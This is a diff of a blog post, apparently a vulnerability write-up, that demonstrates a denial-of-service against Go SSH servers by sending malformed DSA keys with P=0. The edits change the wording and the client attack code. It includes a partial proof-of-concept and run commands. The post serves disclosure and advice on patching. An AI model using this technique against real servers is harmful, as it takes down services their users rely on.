@@ -189,14 +189,14 @@ z = x ^ y</code></pre>
 <p>A small Git hosting provider allows its users to authenticate with SSH keys to its service and their SSH server is coded in Go. To bring this service down an attacker could create numerous fake accounts and upload malformed DSA keys for use in the SSH authentication. All these keys will have their parameter P set to 0. An attacker could then start hundreds of such SSH client connections to the server causing system resources to be locked up leading to an effective DOS.</p>
 <p>Let's test out that scenario.</p>
 <h3 id="the-server">The Server</h3>
-<p>The server is a simple SSH server that accepts session requests and prints the current time to the connection. Thanks to github.com/jpillora for providing this sample server code at <a href="https://gist.github.com/jpillora/b480fde82bff51a06238" class="uri">https://gist.github.com/jpillora/b480fde82bff51a06238</a>. There were minor adjustments made to the code to allow Public Key Authentication instead of password callbacks.</p>
+<p>The server is a simple SSH server that accepts session requests and prints the current time to the connection. Thanks to github.com/jpillora for providing this sample server code at <a href="https://gist.github.com/jpillora/b480fde82bff51a06238" class="uri">https://gist.github.com/jpillora/b480fde82bff51a06238</a>. There were a few adjustments made to the code to allow Public Key Authentication instead of password callbacks.</p>
 <div class="sourceCode"><pre class="sourceCode go"><code class="sourceCode go">config := &amp;ssh.ServerConfig{
     <span class="co">// Accept all authentication requests</span>
     PublicKeyCallback: <span class="kw">func</span>(c ssh.ConnMetadata, key ssh.PublicKey) (*ssh.Permissions, <span class="dt">error</span>) {
         <span class="kw">return</span> <span class="ot">nil</span>, <span class="ot">nil</span>
     },
 }</code></pre></div>
-<p>This will accept all public key authentication requests. Imagine a real service querying out to a database to determine whether a particular user has this public key registered under his/her account. Other than that, the server looks like a very normal Go server that starts listening on a port and accepts connections coming in.</p>
+<p>This will accept all public key authentication requests. Imagine a real service querying out to a database to determine whether a particular user has this public key registered under his/her account. The server looks like a very normal Go server that starts listening on a port and accepts connections coming in.</p>
 <div class="sourceCode"><pre class="sourceCode go"><code class="sourceCode go"><span class="co">// Once a ServerConfig has been configured, connections can be accepted.</span>
 listener, err := net.Listen(<span class="st">&quot;tcp&quot;</span>, *addr)
 <span class="kw">if</span> err != <span class="ot">nil</span> {
@@ -213,9 +213,7 @@ log.Println(<span class="st">&quot;Listening on&quot;</span>, *addr)
     }
     log.Printf(<span class="st">&quot;Accepted an incoming TCP connection from %s&quot;</span>, tcpConn.RemoteAddr())
     <span class="kw">if</span> *p {
-        <span class="kw">go</span> <span class="kw">func</span>() {
-            makeSSHConn(tcpConn, config)
-        }()
+        <span class="kw">go</span> makeSSHConn(tcpConn, config)
     } <span class="kw">else</span> {
         makeSSHConn(tcpConn, config)
     }
@@ -236,7 +234,7 @@ log.Println(<span class="st">&quot;Listening on&quot;</span>, *addr)
     <span class="co">// Accept all channels</span>
     <span class="kw">go</span> handleChannels(chans)
 }</code></pre></div>
-<p>One thing to notice is that <code>if *p</code> check. That corresponds to the <code>-p</code> parallel flag and controls whether the server creates SSH connections on the main goroutine vs a background goroutine. This will be important when we get to the attack section in a bit.</p>
+<p>One thing to notice is that <code>if *p</code> check. That corresponds to the <code>-p</code> flag and controls whether the server performs the SSH handshake on the main goroutine vs a background goroutine. Many online examples use the former. The <code>-p</code> flag will show the difference a blocking operation can have on the performance of a networked server in the attack section later.</p>
 <h3 id="the-client">The Client</h3>
 <p>The client code is a little more involved. It needs modifications to the Go SSH library code to allow for sending a malformed DSA key. The SSH library has been vendored in to the client package. Note that the server code is all 100% unchanged and imports the regular golang.org/x/crypto/ssh package from the workspace.</p>
 <p>The client works in two separate modes controlled by a command line flag called <code>-attack</code>. When the client is started normally, it will make a regular SSH connection to the server and start reading the server's time every few seconds. But when the <code>-attack</code> flag is present, the client will send an authentication request to the server with a malformed DSA public key. Relevant bits of code:</p>
@@ -260,8 +258,7 @@ log.Println(<span class="st">&quot;Listening on&quot;</span>, *addr)
 <span class="kw">func</span> (k *dsaPublicKey) Marshal() []<span class="dt">byte</span> {
     x := k.P
     <span class="kw">if</span> Attack {
-        b := <span class="fu">make</span>([]<span class="dt">byte</span>, <span class="fu">len</span>(k.P.Bytes()))
-        x = <span class="fu">new</span>(big.Int).SetBytes(b)
+        x = big.NewInt(<span class="dv">0</span>)
     }
     w := <span class="kw">struct</span> {
         Name       <span class="dt">string</span>
@@ -279,8 +276,8 @@ log.Println(<span class="st">&quot;Listening on&quot;</span>, *addr)
 <h3 id="the-attack">The Attack</h3>
 <p>The attack has different impact depending on whether the server is started with the <code>-p</code> flag.</p>
 <p>To build the server, cd into the server directory and run: <code>go build -o server .</code> Do the same for the client: <code>go build -o client .</code> There are test RSA and DSA keys in the server and client <code>data</code> directories. If you want to create new ones, use <code>ssh-keygen</code>.</p>
-<h4 id="serial-server">Serial Server</h4>
-<p>If the server was started without the <code>-p</code> flag, then one attacking client can completely freeze the server and no more connections can be accepted. This is because the call to ssh.NewServerConn() is run on the main goroutine and is stuck in the call to dsa.Verify() for client authentication.</p>
+<h4 id="server---main-goroutine">Server - Main Goroutine</h4>
+<p>If the server was started without the <code>-p</code> flag, then one attacking client can completely freeze the server and no more new connections can be accepted. This is because the call to ssh.NewServerConn() is run on the main goroutine and is stuck in the call to dsa.Verify() for client authentication blocking further listener.Accept() calls. When writing networked servers, it is important to keep the accept loop responsive and push any blocking operations off into a background goroutine.</p>
 <p>Start the server normally with:</p>
 <div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash">$ <span class="kw">./server</span> -key=./data/id_rsa
 <span class="kw">2016/04/13</span> 07:30:27 Listening on localhost:8022</code></pre></div>
@@ -304,8 +301,9 @@ log.Println(<span class="st">&quot;Listening on&quot;</span>, *addr)
 <span class="kw">2016/04/13</span> 07:33:36 Accepted an incoming TCP connection from 127.0.0.1:63521</code></pre></div>
 <p>Try connecting another normal client; it is now prevented from connecting too:</p>
 <div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash">$ <span class="kw">./client</span> -key=./data/id_dsa</code></pre></div>
-<h4 id="parallel">Parallel</h4>
-<p>If the server was started with the <code>-p</code> flag, then it can still accept regular clients because the attacker's SSH connections are being tied up in background goroutines. This doesn't lead to an immediate DOS, but will continually eat up the server's CPU and memory resources leading to a slow death.</p>
+<p>The original client is still able to receive responses from the server though.</p>
+<h4 id="server---background-goroutine">Server - Background Goroutine</h4>
+<p>If the server was started with the <code>-p</code> flag, then it can still accept regular client connections because the attacker's SSH connections are being tied up in background goroutines instead of blocking the accept loop on the main goroutine. This doesn't lead to an immediate DOS, but will continually eat up the server's CPU and memory resources leading to a slow death.</p>
 <p>Let's start up the server again, but this time with the <code>-p</code> flag:</p>
 <div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash">$ <span class="kw">./sshd</span> -key=./data/id_rsa -p
 <span class="kw">2016/04/13</span> 07:38:07 Listening on localhost:8022</code></pre></div>
@@ -318,6 +316,6 @@ log.Println(<span class="st">&quot;Listening on&quot;</span>, *addr)
 <span class="kw">Wed</span> Apr 13 07:42:12 CDT 2016</code></pre></div>
 <p>Hey it connects! But all an attacker would need to do is start a few more malicious client connections and the server's CPU and RAM usage will spike. With 4 attacking clients I was able to get ~400% CPU and 1GB of RAM usage before stopping due to my laptop getting a little toasty. Under normal conditions with just 2 normal clients connected to the server my CPU was around 0.2% and RAM usage was 5-6MB. Quite a difference.</p>
 <h2 id="conclusion">Conclusion</h2>
-<p>In conclusion, this vulnerability can be exploited to cause denial of service. Using the scenario above, the CVE score calculator <a href="https://nvd.nist.gov/CVSS/v2-calculator" class="uri">https://nvd.nist.gov/CVSS/v2-calculator</a> gave a score of 3.5/10 - 6.3/10 based on if the server used the <code>-p</code> flag. There aren't any confidentiality or integrity impacts, just a partial/complete availability impact.</p>
-<p>Looking at godoc.org there are currently 164 packages that import <code>crypto/dsa</code>, <a href="https://godoc.org/crypto/dsa?importers" class="uri">https://godoc.org/crypto/dsa?importers</a>. It is recommended to upgrade to the security release when it becomes available.</p>
+<p>In conclusion, this vulnerability can be exploited to cause denial of service. Using the scenario above, the CVE score calculator <a href="https://nvd.nist.gov/CVSS/v2-calculator" class="uri">https://nvd.nist.gov/CVSS/v2-calculator</a> gave a score of 3.5/10. There aren't any confidentiality or integrity impacts, just a partial/complete availability impact.</p>
+<p>Looking at godoc.org there are currently 164 packages that import <code>crypto/dsa</code>, <a href="https://godoc.org/crypto/dsa?importers" class="uri">https://godoc.org/crypto/dsa?importers</a>. It is recommended to upgrade to the security release that is at <a href="https://golang.org/dl/" class="uri">https://golang.org/dl/</a>.</p>
 <p>Overall this was a fun learning experience. If there are any mistakes or improvements that can be made, please let me know. Thanks for reading.</p>
